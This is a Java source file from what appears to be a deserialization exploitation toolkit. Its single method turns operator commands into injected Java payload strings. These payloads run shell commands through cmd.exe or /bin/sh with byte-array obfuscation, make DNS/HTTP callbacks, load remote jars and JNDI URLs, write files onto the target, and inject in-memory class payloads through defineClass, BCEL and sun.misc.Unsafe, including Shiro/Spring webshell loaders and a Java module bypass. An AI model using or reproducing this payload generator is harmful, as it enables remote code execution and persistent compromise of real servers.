package cn.butler.thirdparty.payloads.custom;

import cn.butler.payloads.ObjectPayload;
import me.gv7.woodpecker.bcel.HackBCELs;
import cn.butler.thirdparty.util.BASE64Decoder;
import cn.butler.yso.payloads.util.CommonUtil;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class CommandlUtil {

    /**
     * // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
     * @param command
     * @return
     * @throws Exception
     */
    public static String getCmd(String command) throws Exception {
        String cmd = null;
        if (command.toLowerCase().startsWith(CommandConstant.COMMAND_SLEEP)) {
            int time = Integer.valueOf(command.substring(CommandConstant.COMMAND_SLEEP.length())) * 1000;
            cmd = String.format("java.lang.Thread.sleep(%sL);", time);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_DNSLOG)) {
            String dnslogDomain = command.substring(CommandConstant.COMMAND_DNSLOG.length());
            cmd = String.format("java.net.InetAddress.getAllByName(\"%s\");", dnslogDomain);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_HTTPLOG)) {
            String httplogURL = command.substring(CommandConstant.COMMAND_HTTPLOG.length());
            cmd = String.format("new java.net.URL(\"%s\").getContent();", httplogURL);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_RAW_CMD)) {
            String strCmd = command.substring(CommandConstant.COMMAND_RAW_CMD.length());
            String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
            /* 转义方式转换命令在某些复杂命令下依然存在问题，改用byte/string转换方式*/
            /*cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
             */
            cmd = String.format("java.lang.Runtime.getRuntime().exec(new java.lang.String(new byte[]{%s}));", cmdByteArray);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_WIN_CMD)) {
            String strCmd = command.substring(CommandConstant.COMMAND_WIN_CMD.length());
            String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
            cmd = String.format("String[] cmds = new String[]{\"cmd.exe\",\"/c\",new String(new byte[]{%s})};" +
                "java.lang.Runtime.getRuntime().exec(cmds);", cmdByteArray);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_LINUX_CMD)) {
            String strCmd = command.substring(CommandConstant.COMMAND_LINUX_CMD.length());
            String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
            cmd = String.format("String[] cmds = new String[]{\"/bin/sh\",\"-c\",new String(new byte[]{%s})};" +
                "java.lang.Runtime.getRuntime().exec(cmds);", cmdByteArray);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_AUTO_CMD)) {
            String strCmd = command.substring(CommandConstant.COMMAND_AUTO_CMD.length());
            String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
            cmd = String.format("String[] cmds = null;" +
                "String osType = System.getProperty(\"os.name\").toLowerCase();" +
                "if(osType.contains(\"windows\")){" +
                "    cmds = new String[]{\"cmd.exe\",\"/c\",new java.lang.String(new byte[]{%s})};" +
                "}else{" +
                "    cmds = new String[]{\"/bin/sh\",\"-c\",new java.lang.String(new byte[]{%s})};" +
                "}" +
                "java.lang.Runtime.getRuntime().exec(cmds);", cmdByteArray, cmdByteArray);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_BCEL)) {
            String bcel = command.substring(CommandConstant.COMMAND_BCEL.length());
            cmd = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();", bcel);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_BCEL_CLASS_FILE)) {
            String bcelClassFile = command.substring(CommandConstant.COMMAND_BCEL_CLASS_FILE.length());
            String strBCEL = HackBCELs.encode(bcelClassFile);
            cmd = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();", strBCEL);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_BCEL_WITH_ARGS)) {
            String tmp = command.substring(CommandConstant.COMMAND_BCEL_WITH_ARGS.length());
            String bcelStr = tmp.split("\\|")[0];
            String bcelArgs = tmp.split("\\|")[1];
            cmd = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").getConstructor(new Class[]{String.class}).newInstance(new String[]{new String(new byte[]{%s})});", bcelStr, CommonUtil.stringToByteArrayString(bcelArgs));
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_BCEL_CLASS_FILE_WITH_ARGS)) {
            String tmp = command.substring(CommandConstant.COMMAND_BCEL_CLASS_FILE_WITH_ARGS.length());
            String bcelStr = HackBCELs.encode(tmp.split("\\|")[0]);
            String bcelArgs = tmp.split("\\|")[1];
            cmd = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").getConstructor(new Class[]{String.class}).newInstance(new String[]{new String(new byte[]{%s})});", bcelStr, CommonUtil.stringToByteArrayString(bcelArgs));
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_SCRIPT_FILE)) {
            String scriptFilePath = command.substring(CommandConstant.COMMAND_SCRIPT_FILE.length());
            String scriptFileByteCode = CommonUtil.byteToByteArrayString(CommonUtil.readFileByte(scriptFilePath));
            cmd = String.format("new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(new java.lang.String(new byte[]{%s}));", scriptFileByteCode);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_SCRIPT_BASE64)) {
            // Rhino jdk6 ~ jdk7
            // nashorn jdk8
            String scriptContent = command.substring(CommandConstant.COMMAND_SCRIPT_BASE64.length());
            scriptContent = new String(new BASE64Decoder().decodeBuffer(scriptContent));
            cmd = String.format("new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(new java.lang.String(new byte[]{%s}));", CommonUtil.stringToByteArrayString(scriptContent));
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_UPLOADFILE)) {
            String cmdInfo = command.substring(CommandConstant.COMMAND_UPLOADFILE.length());
            String localFilePath = cmdInfo.split("\\|")[0];
            String remoteFilePath = cmdInfo.split("\\|")[1];
            String fileByteCode = CommonUtil.fileContextToByteArrayString(localFilePath);
            cmd = String.format("new java.io.FileOutputStream(\"%s\").write(new byte[]{%s});", remoteFilePath, fileByteCode);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_UPLOAD_BASE64)) {
            String tmp = command.substring(CommandConstant.COMMAND_UPLOAD_BASE64.length());
            String remoteFilePath = tmp.split("\\|")[0];
            String fileBase64Content = tmp.split("\\|")[1];
            byte[] fileContent = new BASE64Decoder().decodeBuffer(fileBase64Content);
            String fileByteCode = CommonUtil.byteToByteArrayString(fileContent);
            cmd = String.format("new java.io.FileOutputStream(\"%s\").write(new byte[]{%s});", remoteFilePath, fileByteCode);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_LOADJAR)) {
            String cmdInfo = command.substring(CommandConstant.COMMAND_LOADJAR.length());
            String jarpath = cmdInfo.split("\\|")[0];
            String className = cmdInfo.split("\\|")[1];
            cmd = String.format("java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")});" +
                "classLoader.loadClass(\"%s\").newInstance();", jarpath, className);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_LOADJAR_WITH_ARGS)) {
            String cmdInfo = command.substring(CommandConstant.COMMAND_LOADJAR_WITH_ARGS.length());
            String jarpath = cmdInfo.split("\\|")[0];
            String className = cmdInfo.split("\\|")[1];
            String args = cmdInfo.split("\\|")[2];
            cmd = String.format("java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")});" +
                "classLoader.loadClass(\"%s\").getConstructor(String.class).newInstance(\"%s\");", jarpath, className, args);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_JNDI)) {
            String jndiURL = command.substring(CommandConstant.COMMAND_JNDI.length());
            cmd = String.format("new javax.naming.InitialContext().lookup(\"%s\");", jndiURL);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_CODE_FILE)) {
            String codeFile = command.substring(CommandConstant.COMMAND_CODE_FILE.length());
            cmd = new String(CommonUtil.readFileByte(codeFile));
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_CODE_BASE64)) {
            String codeBase64 = command.substring(CommandConstant.COMMAND_CODE_BASE64.length());
            cmd = new String(new BASE64Decoder().decodeBuffer(codeBase64));
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_SYSTEM_PROPERTY_SET)) {
            String nameAndValue = command.substring(CommandConstant.COMMAND_SYSTEM_PROPERTY_SET.length());
            String[] nameAndValueArray = nameAndValue.split(":", 2); // 使用第一个冒号进行切割，限制切割为最多两个部分
            cmd = String.format("System.setProperty(\"%s\",\"%s\");", nameAndValueArray[0], nameAndValueArray[1]);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_SYSTEM_PROPERTY_CLASSLOADER)) {
            String systemNumber = command.substring(CommandConstant.COMMAND_SYSTEM_PROPERTY_CLASSLOADER.length());
            int a = Integer.valueOf(systemNumber);
            String bytestr = "";
            for (int i = 1; i <= a - 1; i++) {
                if (i < a - 1) {
                    bytestr = bytestr + "System.getProperty(\"" + i + "\")+";
                } else {
                    bytestr = bytestr + "System.getProperty(\"" + i + "\");";
                }
            }
            cmd = "{try {" +
                "ClassLoader classLoader = Thread.currentThread().getContextClassLoader();" +
                "String base64Str = " + bytestr +
                "byte[] clazzByte = org.apache.shiro.codec.Base64.decode(base64Str);" +
                "java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class,int.class});" +
                "defineClass.setAccessible(true);" +
                "Class clazz = (Class)defineClass.invoke(classLoader,new Object[]{clazzByte, new Integer(0), new Integer(clazzByte.length)});" +
                "clazz.newInstance();" +
                "}catch (Exception e){}}";
            //COMMAND_CLASSLOADER_BYTECODE: 使用ClassLoader来加载POST体中的内存马,多用于Shiro缩短Header长度
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_SHIRO_SPRING_LOADCLASS)) {
            String parameter = command.substring(CommandConstant.COMMAND_SHIRO_SPRING_LOADCLASS.length());
            //spring-shiro中的类加载
            cmd = String.format("javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();" +
                "java.lang.reflect.Field r=request.getClass().getDeclaredField(\"request\");" +
                "r.setAccessible(true);" +
                "String classData=request.getParameter(\"%s\");" +
                "byte[] classBytes = org.apache.shiro.codec.Base64.decode(classData);" +
                "java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\",new Class[]{byte[].class,int.class,int.class});" +
                "defineClassMethod.setAccessible(true);" +
                "Class evilClass = (Class) defineClassMethod.invoke(java.lang.Thread.currentThread().getContextClassLoader(),new Object[]{classBytes,new Integer(0),new Integer(classBytes.length)});" +
                "evilClass.newInstance();", parameter);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_SPRINGFRAMEWORK_ECHO)) {
            String code = command.substring(CommandConstant.COMMAND_SPRINGFRAMEWORK_ECHO.length());
            cmd = String.format("org.springframework.util.StreamUtils.copy(java.lang.Runtime.getRuntime().exec(\"%s\").getInputStream(),((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes()).getResponse().getOutputStream());",code);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_UNSAFE_DEFINEANONYMOUSCLASS)) {
            String code = "";
            String parameter = command.substring(CommandConstant.COMMAND_UNSAFE_DEFINEANONYMOUSCLASS.length());
            Object[] objects = (Object []) ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",parameter);
            code = Base64.getEncoder().encodeToString((byte[]) objects[1]);

            //这里不进行格式化输出,H2的CreateAlias不支持格式化
            cmd = String.format("String string = \"%s\";" +
                "Class base64;" +
                "byte[] value = null;" +
                "try {" +
                "    base64 = Class.forName(\"java.util.Base64\");" +
                "    Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);" +
                "    value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[] {" +
                "        String.class" +
                "    }).invoke(decoder, new Object[] {" +
                "        string" +
                "    });" +
                "} catch (Exception e) {" +
                "    try {" +
                "        base64 = Class.forName(\"sun.misc.BASE64Decoder\");" +
                "        Object decoder = base64.newInstance();" +
                "        value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[] {" +
                "            String.class" +
                "        }).invoke(decoder, new Object[] {" +
                "            string" +
                "        });" +
                "    } catch (Exception e2) {}" +
                "}" +
                "Class safe = java.lang.Class.forName(\"sun.misc.Unsafe\");" +
                "java.lang.reflect.Field safeCon = safe.getDeclaredField(\"theUnsafe\");" +
                "safeCon.setAccessible(true);" +
                "sun.misc.Unsafe unSafe = (sun.misc.Unsafe) safeCon.get(null);" +
                "unSafe.defineAnonymousClass(java.io.File.class, value, null).newInstance();",code);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_CLASSLOADER_DEFINECLASS)) {
            String code = "";
            String parameter = command.substring(CommandConstant.COMMAND_CLASSLOADER_DEFINECLASS.length());
            Object[] objects = (Object []) ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",parameter);
            code = Base64.getEncoder().encodeToString((byte[]) objects[1]);

            //这里不进行格式化输出,H2的CreateAlias不支持格式化
            cmd = String.format("ClassLoader classLoader = Thread.currentThread().getContextClassLoader();" +
                "java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);" +
                "defineClass.setAccessible(true);" +
                "String bytecodeBase64 = \"%s\";" +
                "byte[] bytecode = null;" +
                "try {" +
                "    Class base64Clz = classLoader.loadClass(\"java.util.Base64\");" +
                "    Class decoderClz = classLoader.loadClass(\"java.util.Base64$Decoder\");" +
                "    Object decoder = base64Clz.getMethod(\"getDecoder\").invoke(base64Clz);" +
                "    bytecode = (byte[]) decoderClz.getMethod(\"decode\", String.class).invoke(decoder, bytecodeBase64);" +
                "} catch (ClassNotFoundException ee) {" +
                "    Class datatypeConverterClz = classLoader.loadClass(\"javax.xml.bind.DatatypeConverter\");" +
                "    bytecode = (byte[]) datatypeConverterClz.getMethod(\"parseBase64Binary\", String.class).invoke(datatypeConverterClz, bytecodeBase64);" +
                "}" +
                "Class clazz = (Class)defineClass.invoke(classLoader,bytecode,0,bytecode.length);" +
                "clazz.newInstance();",code);
        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_BYPASSMODULE_CLASSLOADER_DEFINECLASS)) {
            String code = "";
            String className = "";
            String parameter = "";
            String ready_command = command.substring(CommandConstant.COMMAND_BYPASSMODULE_CLASSLOADER_DEFINECLASS.length());
            String[] split = ready_command.split("\\|", 2);
            className = split[0];
            parameter = split[1];
            Object[] objects = (Object []) ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",parameter);
            code = Base64.getEncoder().encodeToString((byte[]) objects[1]);

             //这里不进行格式化输出,H2的CreateAlias不支持格式化
            cmd = String.format("byte[] standBytes = null;" +
                "String string = \"%s\";" +
                "Class safe = java.lang.Class.forName(\"sun.misc.Unsafe\");" +
                "java.lang.reflect.Field unsafeField = safe.getDeclaredField(\"theUnsafe\");" +
                "unsafeField.setAccessible(true);" +
                "sun.misc.Unsafe unsafe = (sun.misc.Unsafe) unsafeField.get(null);" +
                "java.lang.Module module = java.lang.Object.class.getModule();" +
                "java.lang.Class cls = %s.class;" +
                "long offset = unsafe.objectFieldOffset(java.lang.Class.class.getDeclaredField(\"module\"));" +
                "unsafe.getAndSetObject(cls, offset, module);" +
                "java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "defineClass.setAccessible(true);" +
                "byte[] bytecode = java.util.Base64.getDecoder().decode(string);" +
                "java.lang.Class clazz = (java.lang.Class) defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);" +
                "clazz.newInstance();",code,className);
        } else {
            throw new Exception(String.format("Command [%s] not supported",command));
        }
        return cmd;
    }
}
